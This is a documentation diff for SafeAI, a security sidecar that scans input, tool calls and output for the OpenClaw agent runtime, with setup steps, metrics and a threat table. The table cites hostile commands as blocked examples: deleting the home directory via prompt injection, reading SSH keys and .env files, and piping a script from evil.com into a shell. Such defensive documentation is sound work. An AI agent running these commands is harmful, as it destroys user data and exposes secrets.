+  event: "new_lead",
+  lead: {
+    name: "Alice Johnson",
+    email: "alice@example.com",
+    phone: "555-867-5309",
+    company: "Acme Corp",
+  },
+  metadata: {
+    source: "landing_page",
+    api_key: "sk-live-abc123",  // accidentally included
+  },
+};
+
+const result = await scanStructured(webhookPayload);
+console.log(result.decision.action);
+// => "block" (secret detected in metadata.api_key)
+
+for (const d of result.detections) {
+  console.log(`  ${d.path}: ${d.tag}`);
+}
+// => metadata.api_key: secret.credential
+// => lead.email: personal.pii
+// => lead.phone: personal.pii
+```
+
+---
+
+## Step 10 — Metrics and observability
+
+SafeAI exposes Prometheus-style metrics.
 
 ```bash
-# Install SafeAI hooks for Claude Code
-safeai setup claude-code --config safeai.yaml --path .
-
-# Or for Cursor
-safeai setup cursor --config safeai.yaml --path .
+curl -s http://127.0.0.1:8484/v1/metrics
 ```
 
-Every command the coding agent runs is scanned through SafeAI's hook protocol. If the agent tries to embed an API key in a template, SafeAI blocks it before the file is written.
+```
+# HELP safeai_requests_total Total boundary evaluations
+# TYPE safeai_requests_total counter
+safeai_requests_total{boundary="input",action="block"} 23
+safeai_requests_total{boundary="input",action="allow"} 1847
+safeai_requests_total{boundary="action",action="block"} 8
+safeai_requests_total{boundary="action",action="require_approval"} 12
+safeai_requests_total{boundary="output",action="redact"} 156
+safeai_requests_total{boundary="output",action="allow"} 2034
+```
 
 ---
 
-## What SafeAI prevented
+## What SafeAI prevents
 
-In this single application, SafeAI enforced:
-
-| Threat | SafeAI response | Feature |
+| Threat | Without SafeAI | With SafeAI |
 |:---|:---|:---|
-| API key in a prompt | **Blocked** at input boundary | Secret detection |
-| Client email in a prompt | **Blocked** at input boundary | PII protection |
-| Phone number in LLM response | **Redacted** in output | Output guarding |
-| `drafter` calling `send_email` | **Blocked** — not in identity | Agent identity |
-| `reviewer` sending email | **Held** for attorney approval | Approval workflow |
-| Internal score in tool response | **Stripped** — not in contract | Tool contracts |
-| PII in agent-to-agent message | **Blocked/redacted** | Agent messaging |
-| PII in nested JSON payload | **Detected** with field path | Structured scanning |
-| Raw API key access | **Scoped** via capability token | Capability tokens |
-| Draft stored in memory | **Encrypted** with auto-expiry | Encrypted memory |
-| Every decision | **Logged** with context hash | Audit logging |
-
-All of this with a single `SafeAI.from_config("safeai.yaml")` call and standard YAML configuration.
+| `rm -rf ~/` via prompt injection | Files deleted | **Blocked** — destructive command policy |
+| Agent reads `~/.ssh/id_rsa` | Private key exposed to model | **Blocked** — sensitive filesystem policy |
+| API key in inbound WhatsApp message | Key forwarded to Claude/OpenAI | **Blocked** — secret detection |
+| Model hallucinates phone number | PII shown to user | **Redacted** — output guard |
+| Agent sends WhatsApp message autonomously | Message sent without consent | **Held** — requires user approval |
+| `git push` to public repo | Code pushed without review | **Held** — requires user approval |
+| `curl https://evil.com/steal \| sh` | Arbitrary code execution | **Blocked** — destructive command policy |
+| Webhook payload contains leaked API key | Key reaches the model context | **Blocked** — structured scanning |
+| Agent reads `.env` for "troubleshooting" | Env vars (secrets) exposed | **Blocked** — sensitive filesystem policy |
 
 ---
 
-## Full project structure
+## Running both as system services
 
+For always-on operation, run SafeAI alongside OpenClaw's daemon.
+
+```bash title="Start SafeAI as a background service"
+# Using systemd (Linux)
+cat > ~/.config/systemd/user/safeai.service << 'EOF'
+[Unit]
+Description=SafeAI Sidecar for OpenClaw
+After=network.target
+
+[Service]
+ExecStart=safeai serve --mode sidecar --port 8484 --config %h/openclaw-workspace/safeai.yaml
+Restart=always
+
+[Install]
+WantedBy=default.target
+EOF
+
+systemctl --user enable --now safeai
+
+# Using launchd (macOS)
+cat > ~/Library/LaunchAgents/com.safeai.sidecar.plist << 'EOF'
+<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
+<plist version="1.0">
+<dict>
+  <key>Label</key>
+  <string>com.safeai.sidecar</string>
+  <key>ProgramArguments</key>
+  <array>
+    <string>safeai</string>
+    <string>serve</string>
+    <string>--mode</string>
+    <string>sidecar</string>
+    <string>--port</string>
+    <string>8484</string>
+    <string>--config</string>
+    <string>safeai.yaml</string>
+  </array>
+  <key>WorkingDirectory</key>
+  <string>/Users/you/openclaw-workspace</string>
+  <key>KeepAlive</key>
+  <true/>
+</dict>
+</plist>
+EOF
+
+launchctl load ~/Library/LaunchAgents/com.safeai.sidecar.plist
 ```
-openclaw/
-├── safeai.yaml              # Main SafeAI configuration
-├── policies/
-│   └── openclaw.yaml        # Policy rules
-├── contracts/
-│   └── openclaw.yaml        # Tool contracts
-├── agents/
-│   └── openclaw.yaml        # Agent identities
-├── schemas/
-│   └── memory.yaml          # Memory schemas
-├── openclaw/
-│   ├── runtime.py           # SafeAI initialization
-│   ├── chat.py              # Input scanning + output guarding
-│   ├── tools.py             # Tool definitions
-│   └── agent.py             # LangChain integration
-└── tests/
-    └── test_security.py     # Boundary enforcement tests
-```
+
+---
+
+## Summary
+
+SafeAI and OpenClaw work together naturally:
+
+- **OpenClaw** is the agent runtime — it reasons, plans, and calls tools
+- **SafeAI** is the security layer — it enforces policy at every boundary
+
+You didn't modify a single line of OpenClaw's source code. SafeAI runs as a sidecar, and the OpenClaw skill calls it via HTTP before every tool execution and after every model response.
+
+The key integration points:
+
+1. **Input boundary** — `POST /v1/scan/input` before the model sees any message
+2. **Action boundary** — `POST /v1/intercept/tool` before any tool executes
+3. **Output boundary** — `POST /v1/guard/output` before any response is shown
+4. **Structured scanning** — `POST /v1/scan/structured` for webhook payloads
+5. **Approvals** — `safeai approvals` CLI for human-in-the-loop gates
+6. **Audit** — `safeai logs` and `/v1/audit/query` for full decision trail
 
 ---
 
 ## Next steps
 
-- [Installation](../getting-started/installation.md) — get SafeAI running
-- [Policy Engine](../guides/policy-engine.md) — deep dive into rule design
-- [Tool Contracts](../guides/tool-contracts.md) — define what each tool can see
-- [Approval Workflows](../guides/approval-workflows.md) — configure human-in-the-loop gates
-- [Integrations](../integrations/index.md) — connect to your framework
+- [SafeAI Installation](../getting-started/installation.md) — get SafeAI running
+- [Proxy / Sidecar Guide](../integrations/proxy-sidecar.md) — full REST API reference
+- [Policy Engine](../guides/policy-engine.md) — design custom rules
+- [Dangerous Commands](../guides/dangerous-commands.md) — destructive command detection
+- [Approval Workflows](../guides/approval-workflows.md) — human-in-the-loop gates
+- [OpenClaw Documentation](https://github.com/openclaw/openclaw) — OpenClaw setup and skills
